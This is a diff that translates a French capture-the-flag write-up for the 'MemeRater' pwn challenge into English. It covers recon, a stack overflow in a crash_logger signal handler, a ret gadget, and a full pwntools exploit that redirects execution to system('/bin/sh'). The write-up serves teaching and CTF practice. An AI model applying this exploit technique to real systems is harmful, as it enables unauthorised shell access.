@@ -1,14 +1,14 @@
-# MemeRater — writeup simple
+# MemeRater — short writeup
 
-**Catégorie :** pwn · **Service :** `nc memerater.zerodays.events 5222`
+**Category:** pwn · **Service:** `nc memerater.zerodays.events 5222`
 
-**Chaîne d’exploit (résumé) :** une première note énorme → **SIGSEGV** → handler **`crash_logger`** → **`read(256)`** dans **64** octets → overflow → **`ret` @ 0x40101a** → **`memer` @ 0x4011a6** → `system("/bin/sh")`.
+**Exploit chain (summary):** a huge first rating → **SIGSEGV** → **`crash_logger`** handler → **`read(256)`** into **64** bytes → overflow → **`ret` @ 0x40101a** → **`memer` @ 0x4011a6** → `system("/bin/sh")`.
 
 ---
-![Liste des fonctions : `memer`, `crash_logger`, `main`, `system@plt`, `read@plt`, …](capture/chalenge.png)
+![Function list: `memer`, `crash_logger`, `main`, `system@plt`, `read@plt`, …](capture/chalenge.png)
 
 
-## 1. Reconnaissance
+## 1. Recon
 
 ### `file`
 
@@ -16,7 +16,7 @@
 file ./meme_rater
 ```
 
-![Résultat de `file` : ELF64, non strippé, etc.](capture/file.png)
+![`file` output: ELF64, not stripped, etc.](capture/file.png)
 
 ### `checksec`
 
@@ -24,15 +24,15 @@ file ./meme_rater
 checksec --file=./meme_rater
 ```
 
-![Protections : pas de canary, pas de PIE, NX activé](capture/checksec.png)
+![Mitigations: no canary, no PIE, NX enabled](capture/checksec.png)
 
-*(Pas de canary et pas de PIE → adresses stables ; NX → pas de shellcode exécutable sur la pile.)*
+*(No canary and no PIE → stable addresses; NX → no executable shellcode on the stack.)*
 
 ---
 
-## 2. Symboles et PLT (pwndbg)
+## 2. Symbols and PLT (pwndbg)
 
-Lister les fonctions utiles et les imports **`system`**, **`read`**, **`scanf`** :
+List useful functions and **`system`**, **`read`**, **`scanf`** imports:
 
 ```text
 gdb ./meme_rater
@@ -43,9 +43,9 @@ pwndbg> info functions
 
 ---
 
-## 3. Cible shell : `memer`
+## 3. Shell target: `memer`
 
-### Désassemblage pwndbg
+### pwndbg disassembly
 
 ```text
 pwndbg> disassemble memer
@@ -62,26 +62,26 @@ Dump of assembler code for function memer:
 End of assembler dump.
 ```
 
-Vérifier la chaîne passée à `rdi` :
+Check the string passed in `rdi`:
 
 ```text
 pwndbg> x/s 0x40210a
 0x40210a: "/bin/sh"
 ```
 
-**Erreur classique :** `x/s 0x4021a` → mauvaise adresse (tronquée ou incomplète). Utiliser l’adresse du commentaire **`lea`** : **`0x40210a`**.
+**Common mistake:** `x/s 0x4021a` → wrong address (truncated or incomplete). Use the address from the **`lea`** comment: **`0x40210a`**.
 
-### Vue statique (Ghidra) — optionnel
+### Static view (Ghidra) — optional
 
-Même logique : repérer **`memer`**, **`system`**, la chaîne **`/bin/sh`**.
+Same idea: locate **`memer`**, **`system`**, the **`/bin/sh`** string.
 
-![Analyse statique dans Ghidra (fonctions / strings)](capture/ghidra.png)
+![Static analysis in Ghidra (functions / strings)](capture/ghidra.png)
 
 ---
 
-## 4. Overflow : `crash_logger`
+## 4. Overflow: `crash_logger`
 
-### Désassemblage
+### Disassembly
 
 ```text
 pwndbg> disassemble crash_logger
@@ -100,17 +100,17 @@ pwndbg> disassemble crash_logger
    0x000000000040122f <+115>:   ret
 ```
 
-- Tampon **`[rbp-0x40]`** → **64** octets.
-- **`read`** demande **0x100** octets → **stack buffer overflow** sur la pile du handler.
+- Buffer **`[rbp-0x40]`** → **64** bytes.
+- **`read`** requests **0x100** bytes → **stack buffer overflow** on the handler’s stack.
 
-**Débogage :** `break *0x40120f` (juste après `read`), puis `run < <(python3 gen.py)` : phase 1 = six notes (première énorme), phase 2 = **`cyclic`** pour mesurer l’offset jusqu’au **`RIP`** (**72** octets = 64 + saved `rbp`).
+**Debugging:** `break *0x40120f` (right after `read`), then `run < <(python3 gen.py)`: phase 1 = six ratings (first one huge), phase 2 = **`cyclic`** to measure offset to **`RIP`** (**72** bytes = 64 + saved `rbp`).
 
-### Script `gen.py` (stdin en deux phases)
+### `gen.py` script (two-phase stdin)
 
 
 ---
 
-## 5. Gadget `ret`
+## 5. `ret` gadget
 
 ```bash
 ROPgadget --binary ./meme_rater | grep ': ret$'
@@ -120,32 +120,32 @@ ROPgadget --binary ./meme_rater | grep ': ret$'
 0x000000000040101a : ret
 ```
 
-Un seul **`ret`** suffit pour l’alignement de pile avant l’appel à **`system`** dans **`memer`**.
+A single **`ret`** is enough for stack alignment before the **`system`** call inside **`memer`**.
 
 ---
 
 ## 6. Payload
 
-| Élément | Valeur |
-|---------|--------|
-| Padding | 64 octets |
+| Item | Value |
+|------|--------|
+| Padding | 64 bytes |
 | `saved rbp` | `0` |
 | Gadget | `0x40101a` (`ret`) |
-| Cible | `0x4011a6` (`memer`) |
+| Target | `0x4011a6` (`memer`) |
 
 ---
 
 ## 7. Exploit (pwntools)
 
-Code complet (copie aussi dans [`exploit.py`](./exploit.py)) :
+Full code (also copied in [`exploit.py`](./exploit.py)):
 
 ```python
 #!/usr/bin/env python3
 """
 MemeRater pwn:
-1. La vérification 1–100 est bogueuse : tout entier positif passe ; le 1er devient un index dans tier_table -> OOB -> SIGSEGV.
-2. crash_logger() fait read(0, buf, 0x100) dans 64 octets -> overflow.
-3. memer() appelle system("/bin/sh") @ 0x4011a6. Un gadget ret (0x40101a) avant corrige l'alignement pour libc system.
+1. The 1–100 check is buggy: any positive int passes; the first becomes an index into tier_table -> OOB -> SIGSEGV.
+2. crash_logger() does read(0, buf, 0x100) into 64 bytes -> overflow.
+3. memer() calls system("/bin/sh") @ 0x4011a6. A ret gadget (0x40101a) before fixes stack alignment for libc system.
 """
 from pwn import *
 
@@ -163,7 +163,7 @@ def exploit(io):
         io.sendlineafter(b": ", str(huge if i == 0 else 50).encode())
 
     io.recvuntil(b"fix it..")
-    # buf 64 @ rbp-0x40, puis saved rbp, puis ret
+    # buf 64 @ rbp-0x40, then saved rbp, then ret
     payload = b"A" * 64 + p64(0) + p64(RET) + p64(MEMER)
     io.send(payload)
 
@@ -187,11 +187,11 @@ if __name__ == "__main__":
     main()
 ```
 
-Lancement :
+Run:
 
 ```bash
 python3 exploit.py
-# test local :
+# local test:
 python3 exploit.py local
 ```
 
